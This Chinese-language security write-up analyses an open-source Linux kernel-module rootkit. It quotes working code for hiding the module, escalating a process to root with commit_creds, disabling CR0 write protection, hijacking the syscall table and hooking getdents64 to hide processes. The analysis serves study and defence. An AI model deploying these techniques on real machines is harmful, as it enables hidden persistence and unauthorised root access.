简介
--

`reveng_rtkit`是一个基于 Linux 可加载内核模块（又名 LKM）的 rootkit，目标是 Linux Kernel: 5.11.0-49-generic。这个工具主要分两部分，内核模块和用户模块。

内核模块
----

这个作者的代码分类比较清晰。内核模块一个三个文件：

reveng\_rtkit.c：主逻辑文件，包括移除模块。

hide\_show\_helper：隐藏和显示当前模块

hook\_syscall\_helper：隐藏和显示进程，反弹shell

隐藏模块
----

内核模块运行后，先对自身进程隐藏，主要从一下四个方面：

- lsmod命令
- /proc/kallsyms
- /proc/modules
- /sys/module/

作者采用直接调用系统函数`list_del()`从链表中删除当前模块的方式，来到达隐藏。

 list\_del(&amp;THIS\_MODULE-&gt;list);

![image-20230307170641761.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-d0f91860dfceaab91b2a3d76fdeeb685a5f114c1.png)  
`/sys/module/`目录不同于其他几个模块目录，其具有**映射能力**，并且是**kobject 结构**。调用`kobject_del()`函数进行删除。

 kobject\_del(&amp;THIS\_MODULE-&gt;mkobj.kobj);

PATH：linux-5.15.98\\lib\\kobject.c

![image-20230307173635420.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-b29d452b460b838d8a64db7e032bdc2a1b639ec6.png)  
path：linux-5.15.98\\include\\linux\\module.h

![image-20230307171452842.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-718ccd1a6beb37bd935bb063dc7b0b2e1eadb072.png)

![image-20230307171517991.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-074310d30005205d09cbd3894a6645bad1b2fea7.png)  
需要显示的时候，直接再把当前模块地址添加到链表中

 list\_add(&amp;THIS\_MODULE-&gt;list, prev\_module\_in\_proc\_modules\_lsmod);

![image-20230307173947747.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-722c42f985ee1f76ec01c11405febae6faf4418e.png)  
`/sys/module/`目录添加。调用`kobject_add()`函数添加，这里还多了一个`kobject_put`函数，原因在下边函数表述里。

 kobject\_add(&amp;THIS\_MODULE-&gt;mkobj.kobj);  
 kobject\_put(&amp;THIS\_MODULE-&gt;mkobj.kobj);

![image-20230307174521746.png](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-7d8073bd041ef2af13f4bb107d1c8f9cc770db85.png)  
释放掉不用的对象，防止`rmmod`的时候崩溃。

 // Freeing  
 kfree(THIS\_MODULE-&gt;notes\_attrs);  
 THIS\_MODULE-&gt;notes\_attrs \\= NULL;  
 ​  
 kfree(THIS\_MODULE-&gt;sect\_attrs);  
 THIS\_MODULE-&gt;sect\_attrs \\= NULL;  
 ​  
 kfree(THIS\_MODULE-&gt;mkobj.mp);  
 THIS\_MODULE-&gt;mkobj.mp \\= NULL;  
 THIS\_MODULE-&gt;modinfo\_attrs-&gt;attr.name \\= NULL;  
 ​  
 kfree(THIS\_MODULE-&gt;mkobj.drivers\_dir);  
 THIS\_MODULE-&gt;mkobj.drivers\_dir \\= NULL;

反弹shell
-------

直接利用`prepare_creds`函数。`prepare_creds()`是一个 Linux 内核函数，定义在 security/commoncap.c 中。该函数的作用是为当前进程创建一个新的 cred 结构体，其中包含了进程的 UID、GID、辅助组等身份信息，用于在进程执行时检查权限。

该函数没有参数，返回值是一个指向 cred 结构体的指针，表示新创建的身份信息。

在使用 prepare\_creds() 函数创建新的 cred 结构体后，可以使用 commit\_creds() 函数将其应用于当前进程，使得当前进程的身份信息发生变化。

 struct cred \*root \\= prepare\_creds();  
 ​  
 if (root \\== NULL)  
 {  
 return;  
 }  
 ​  
 // Updating ids to 0 i.e. root  
 root-&gt;uid.val \\= root-&gt;gid.val \\= 0;  
 root-&gt;euid.val \\= root-&gt;egid.val \\= 0;  
 root-&gt;suid.val \\= root-&gt;sgid.val \\= 0;  
 root-&gt;fsuid.val \\= root-&gt;fsgid.val \\= 0;  
 ​  
 // Setting the updated value to cred structure  
 commit\_creds(root);

用户和内核交互
-------

### 方法一、IOCTL（**`Input Output ConTroL`**）

要执行IOCTL，需要：1.设备驱动程序（这里是LKM模块）。2.用户模式程序（控制端）。

```php
 long ioctl(struct file \*filp, unsigned int cmd, unsigned long arg);
```

**用户模式程序**

ioctl函数filp是设备文件描述符，cmd是操作命令，后面的可选参数取决于命令的实现。

filp：打开一个可读写的流即可，不局限于文件。

cmd：对字符设备的操作，读、写、打开、关闭等等。

arg：通常用来传递参数。这里是对rootkit执行的命令。

**设备驱动程序**

这位作者没有像reptile作者那样直接hook，而是采用正常设备交互流程。

先定义好操作命令对应的函数

```php
 char value\[20\];  
 ​  
 static int etx\_open(struct inode \*inode, struct file \*file)  
 {  
         pr\_info("\[+\] Device File Opened...!!!\\n");  
         return 0;  
 }  
 ​  
 static long etx\_ioctl(struct file \*file, unsigned int cmd, unsigned long arg)  
 {  
    if( copy\_from\_user(value ,(int32\_t\*) arg, MAX\_LIMIT) )  
     {  
         pr\_err("Data Write : Err!\\n");  
     }  
     if (strncmp(ROOTKIT\_HIDE, value, strlen(ROOTKIT\_HIDE)) \== 0)  
     {  
         hide\_rootkit();  
      }  
     ······  
       
     return 0;  
 }  
 ​  
 static ssize\_t etx\_read(struct file \*filp, char \_\_user \*buf, size\_t len, loff\_t \*off)  
 {  
         pr\_info("   \[+\] Read Function\\n");  
         return 0;  
 }  
 ​  
 static ssize\_t etx\_write(struct file \*filp, const char \_\_user \*buf, size\_t len, loff\_t \*off)  
 {  
         pr\_info("   \[+\] Write function\\n");  
         return len;  
 }  
 ······
```

把函数和对应的设备操作命令关联上

<https://elixir.bootlin.com/linux/v5.11/source/include/linux/fs.h#L1820>

其实这里只需要定义一个成员即可`.unlocked_ioctl`：调用设备文件 ioctl() 函数时调用的函数指针（不需要加锁）。那么，具体的rootkit命令处理逻辑就放在这个函数指针下即可。

```php
static struct file\_operations fops =  
{  
    .owner          = THIS\_MODULE,  
    .read           = etx\_read,  
    .write          = etx\_write,  
    .open           = etx\_open,  
    .unlocked\_ioctl = etx\_ioctl,  
    .release        = etx\_release,  
};
```

使用`alloc_chrdev_region`函数注册字符设备

分配设备号

```php
static dev\_t dev;  
if ((ret = alloc\_chrdev\_region(&dev, 0,  1, "mydev")) < 0) {  
    printk(KERN\_ERR "Failed to allocate device number\\n");  
    return ret;  
}
```

创建设备文件类

```php
    if((dev\_class = class\_create(THIS\_MODULE,"etx\_class")) == NULL)  
    {  
        pr\_err("Cannot create the struct class\\n");  
        goto r\_class;  
        }
```

创建设备文件

```php
    if((device\_create(dev\_class,NULL,dev,NULL,"etx\_device")) == NULL)  
    {  
        pr\_err("Cannot create the Device 1\\n");  
        goto r\_device;  
        }
```

初始化字符设备结构

```php
cdev\_init(&etx\_cdev,&fops);
```

将字符设备加入系统

```php
    if((cdev\_add(&etx\_cdev,dev,1)) < 0)  
    {  
        pr\_err("Cannot add the device to the system\\n");  
        goto r\_class;  
        }
```

至此，设备驱动的两端完成。

### 方法二、`Syscall Interception/ Hijacking`方法

**获取系统调用表**

本来可以直接用`kallsyms_lookup_name`函数，但是从Linux内核5.7.0之后不再导出此函数。可以改用`kprobe`获取。

`kprobe`是 Linux 内核提供的一种用于动态跟踪内核函数调用的机制。它允许开发人员在系统运行时注册一个探针，当内核执行特定的代码路径时，该探针就会被触发并执行一个预定义的处理函数。

利用 kprobe 可以方便地监视和分析内核中的各种事件，如系统调用、驱动程序中的函数调用、网络数据包处理等等。在获取内核函数地址时，可以通过注册一个 kprobe 来监视该函数的调用，并在处理函数中获取函数的地址。

首先定义了一个 kprobe 对象 kp，并将其 symbol\_name 字段设置为要监视的函数名`kallsyms_lookup_name`

```php
static struct kprobe kp = {  
            .symbol\_name = "kallsyms\_lookup\_name"  
};
```

调用 register\_kprobe() 函数注册这个 kprobe，直接调用`addr`成员获取地址

```php
typedef unsigned long (\*kallsyms\_lookup\_name\_t)(const char \*name);  

kallsyms\_lookup\_name\_t kallsyms\_lookup\_name;  
register\_kprobe(&kp);  
kallsyms\_lookup\_name = (kallsyms\_lookup\_name\_t) kp.addr;  
unregister\_kprobe(&kp);
```

再利用`kallsyms_lookup_name`获取`sys_call_table`地址

```php
syscall\_table = (unsigned long\*)kallsyms\_lookup\_name("sys\_call\_table");
```

**几个系统调用概念**

`getdents64`是一个系统调用，用于读取目录中的文件信息。该系统调用的函数原型为：

其中，fd表示要读取的目录的文件描述符，dirp是指向用于存储读取结果的缓冲区的指针，count表示缓冲区的大小。

int getdents64(unsigned int fd, struct linux\_dirent64 \*dirp, unsigned int count);

`kill`也是一个系统调用，用于向指定进程发送信号。该系统调用的函数原型为：

其中，pid是要发送信号的进程的PID，sig是要发送的信号编号。

int kill(pid\_t pid, int sig);

`pt_regs`是一个结构体，用于在内核中存储进程或中断的寄存器状态。

它包含了CPU中所有通用寄存器（如eax，ebx，ecx等）以及特殊寄存器（如标志寄存器eflags，指令指针寄存器eip等）的值。在系统调用中，这个结构体还包含了传递给系统调用的参数。

在Linux内核中，这个结构体通常用于保存和恢复用户空间和内核空间之间的上下文。当内核进入中断处理程序或系统调用时，它会保存当前进程的寄存器状态到这个结构体中。然后，在处理完中断或系统调用后，它会恢复这些寄存器的值，以便进程可以继续执行。

pt\_regs结构体定义在文件include/linux/ptrace.h中。

`read_cr0()`是用于内核开发的 x86 CPU 指令，它读取当前处理器上控制寄存器 0 (CR0) 的值。

在 x86 CPU 中，CR0 寄存器用于控制各种系统设置，包括：

启用或禁用内存缓存 启用或禁用写保护 启用或禁用硬件级调试 启用或禁用系统级性能监控 启用或禁用内存分页 在内核开发中，read\_cr0() 用于检索 CR0 的当前值，可以使用 write\_cr0() 等其他指令修改该值以更改系统设置。 例如，read\_cr0() 的一种常见用途是禁用内核中的写保护，这允许内核代码修改只读页面。

**修改内核读写**

在修改之前`syscall table`，我们首先需要禁用控制寄存器（或 cr0 reg）中的 WP（写保护）标志，以使系统调用表从只读模式可编辑/可写。

```php
write\_cr0\_forced(cr0 & ~0x00010000);
```

**系统调用劫持**

通过系统调用表分别获取`__NR_getdents64`和`__NR_kill`地址。先保存，以备后续恢复。

```php
orig\_getdents64 = (tt\_syscall)\_\_sys\_call\_table\[\_\_NR\_getdents64\];  
orig\_kill = (tt\_syscall)\_\_sys\_call\_table\[\_\_NR\_kill\];
```

再把自定义的处理函数地址分别指向`__NR_getdents64`和`__NR_kill`，这样就把两个系统调用劫持了。

\_\_sys\_call\_table\[\_\_NR\_getdents64\] = (unsigned long) hacked\_getdents64;  
\_\_sys\_call\_table\[\_\_NR\_kill\] = (unsigned long) hacked\_kill;

**自定义函数**

hacked\_getdents64

这个函数首先获取了传递给 getdents64 系统调用的参数。

```php
struct linux\_dirent \*dirent = (struct linux\_dirent \*) pt\_regs->si;  
struct linux\_dirent64 \*dir, \*kdirent, \*prev = NULL;  
kdirent = kzalloc(ret, GFP\_KERNEL);  
err = copy\_from\_user(kdirent, dirent, ret);
```

然后，它调用了 orig\_getdents64 函数来获取真正的 getdents64 的返回值，

```php
 int ret \= orig\_getdents64(pt\_regs), err;
```

接下来，它检查了内核中的一些参数，比如当前进程是否是 proc 进程。

```php
 struct inode \*d\_inode;  
 d\_inode \= current\->files\->fdt\->fd\[fd\]\->f\_path.dentry\->d\_inode;  
 if (d\_inode\->i\_ino \== PROC\_ROOT\_INO && !MAJOR(d\_inode\->i\_rdev)
```

最后，它对传递回来的目录信息进行了修改，以实现隐藏特定进程的效果。

 while (offset &lt; ret)  
 {  
 dir \\= (void \*)kdirent + offset;  
 ​  
 if ((proc &amp;&amp; is\_invisible(simple\_strtoul(dir-&gt;d\_name, NULL, 10))))  
 {  
 if (dir \\== kdirent)  
 {  
 ret -= dir-&gt;d\_reclen;  
 memmove(dir, (void \*)dir + dir-&gt;d\_reclen, ret);  
 continue;  
 }  
 prev-&gt;d\_reclen += dir-&gt;d\_reclen;  
 }  
 else  
 {  
 prev \\= dir;  
 }  
 offset += dir-&gt;d\_reclen;  
 }

最后，它将修改后的目录信息复制回用户空间，返回真正的返回值。

 copy\_to\_user(dirent, kdirent, ret);